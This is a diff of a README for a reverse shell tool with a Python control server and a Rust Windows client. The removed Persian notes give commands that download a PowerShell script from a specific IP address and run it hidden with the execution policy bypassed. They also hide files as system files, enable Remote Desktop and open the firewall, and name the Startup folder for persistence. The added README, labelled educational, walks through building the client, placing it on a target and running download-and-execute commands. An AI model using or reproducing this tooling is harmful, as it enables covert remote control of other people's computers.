@@ -1,63 +1,125 @@
-sudo apt update
-sudo apt install python3-pip
-sudo ufw allow 443
-pip install -r requirements.txt
+# 🐍 Reverse Shell (Python Server & Rust Client)
 
+This project is a simple yet effective reverse shell, consisting of a Python server for managing connections and a Rust-based client for the Windows operating system. This tool is designed for **educational purposes and penetration testing**.
 
--------
-دستورات مهم روی cmd
-دانلود فایل روی سیستم victim
-curl -o "test2.ps1" "http://88.198.104.155/test2.ps1" 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "bak2.ps1"
+## 📋 Features
 
-attrib +h +s "C:\مسیر\فایل\filename.ext"
-مخفی کردن به صورتی که به این راحتی ها پیدا نمیشه
+- ✅ **Python Server:** Lightweight and runnable on Linux-based operating systems.
+- 🔐 **Encrypted Communication:** Utilizes the `pycryptodome` library for data encryption.
+- 🖥️ **Rust Client:** Compiles to a small, fast `.exe` executable for Windows.
+- 📡 **Session Management:** Capable of handling multiple concurrent connections.
+- 🛡️ **Firewall Bypass:** Uses port 443 to reduce the likelihood of traffic being blocked.
 
-File Explorer را باز کنید.
+---
 
-به View → Show → Hidden items بروید و تیکش را بزنید.
+## 🚩 Prerequisites
 
-سپس به Options → View بروید.
+### For the Server (Ubuntu Server)
 
-تیک گزینه Hide protected operating system files (Recommended) را بردارید.
+- An Ubuntu server or virtual machine with a **static IP address**.
+- Python 3 installed.
+- `pip` (Python's package installer) installed.
 
-پیغام هشدار را تایید کنید.
+### For Compiling the Client (Windows)
 
-✅ حالا فایل‌هایی که هم Hidden و هم System هستند هم نمایش داده می‌شوند.
-اینطوری دوباره ظاهر میشه
+- The **Rust** programming language installed. (You can download it from [here](https://www.rust-lang.org/tools/install))
+- **Microsoft Visual Studio Build Tools** with **C++** support installed. (You can download it from [here](https://visualstudio.microsoft.com/visual-cpp-build-tools/))
 
+---
 
-فعال کردن ریموت دسکتاپ
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-sc config TermService start= auto
-sc start TermService
-اطمینان از دسترسی دادن فایروال
-netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
+## 🛠 Server Installation & Setup
 
-مسیر پوشه استارت آپ
-C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-----------------------
-install Visual Studio Build Tools for C++ from:
-https://visualstudio.microsoft.com/visual-cpp-build-tools/
+Follow these steps on your Ubuntu server:
 
-find main.rs and change this line:
-    let server_addr = "88.198.104.155:37945";
-Replace it with your Linux server’s IP address
+1.  First, update your system and install `pip`:
+    ```bash
+    sudo apt update
+    sudo apt install python3-pip
+    ```
 
+2.  Open the desired port (443 in this example) in your firewall:
+    ```bash
+    sudo ufw allow 443
+    ```
 
-cd reverse_shell
-cargo build --release --target x86_64-pc-windows-msvc
+3.  Clone the project from GitHub and navigate into its directory.
 
-you can find exe file in:
-	target\x86_64-pc-windows-msvc\release\reverse_shell.exe
+4.  Install the required Python libraries. (Ensure a `requirements.txt` file exists in the project and includes `pycryptodome`.)
+    ```bash
+    pip install -r requirements.txt
+    ```
 
+5.  Run the server:
+    ```bash
+    python3 server.py
+    ```
+    or
+    ```bash
+    python server.py
+    ```
 
-اجرا بدون باز شدن پنجره
-start /B reverse_shell.exe
+At this point, the server is active and will listen for incoming client connections. You can type `help` at any time in the server terminal to see the list of available commands.
 
-پس از اجرای سرور، دستورات زیر را می‌توانید استفاده کنید:
+---
 
-sessions: نمایش لیست سشن‌های فعال
-connect <id>: اتصال به یک سشن خاص
-info <id>: دریافت اطلاعات سیستم یک سشن
-exit: خروج از سرور
+## 🔨 Building the Client Executable (Exe)
+
+To build the `.exe` file that will run on the target Windows system, follow these steps:
+
+1.  Ensure you have installed the prerequisites for **Rust** and **Visual Studio Build Tools**.
+
+2.  Navigate to the client directory in the project:
+    ```bash
+    cd reverse_shell
+    ```
+
+3.  Open the `main.rs` file with a text editor.
+
+4.  Find the following line and replace it with your Linux server's IP address and port. (Using port 443 is recommended)
+    ```rust
+    let server_addr = "YOUR_SERVER_IP:443"; // <-- Replace with your server's IP
+    ```
+
+5.  Run the following command to compile the project:
+    ```bash
+    cargo build --release --target x86_64-pc-windows-msvc
+    ```
+
+6.  The executable `.exe` file will be created at the following path:
+    ```
+    target\x86_64-pc-windows-msvc\release\reverse_shell.exe
+    ```
+
+> **⚠️ Important Warning:** Never run the `reverse_shell.exe` file on your own machine! This file is designed to be executed on the target system. For testing, always use a virtual machine.
+
+---
+
+## 📖 How to Use
+
+1.  Run the server on your Ubuntu VM as described in the setup instructions.
+2.  Transfer the compiled `reverse_shell.exe` file to the target Windows machine.
+3.  Execute the `reverse_shell.exe` file on the target system.
+4.  Immediately after execution, a new connection will appear in your server's terminal.
+
+---
+
+## 🎯 Commands
+
+### Server Commands (For Managing Connections)
+
+Enter these commands in the Python server terminal:
+
+- `help`: Displays the list of available commands.
+- `sessions`: Shows all active sessions (connections).
+- `connect <id>`: Connects to a specific session to send commands. (e.g., `connect 1`)
+- `info <id>`: Retrieves basic system information for a specific session.
+- `exit`: Shuts down the server completely.
+
+### Example Client-Side Commands (To Run on the Target)
+
+After connecting to a session using the `connect` command, you can send the following commands to perform various actions on the target system:
+
+#### Download and Execute a PowerShell Script
+```cmd
+curl -o "script.ps1" "http://your-server.com/script.ps1" 
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "script.ps1"
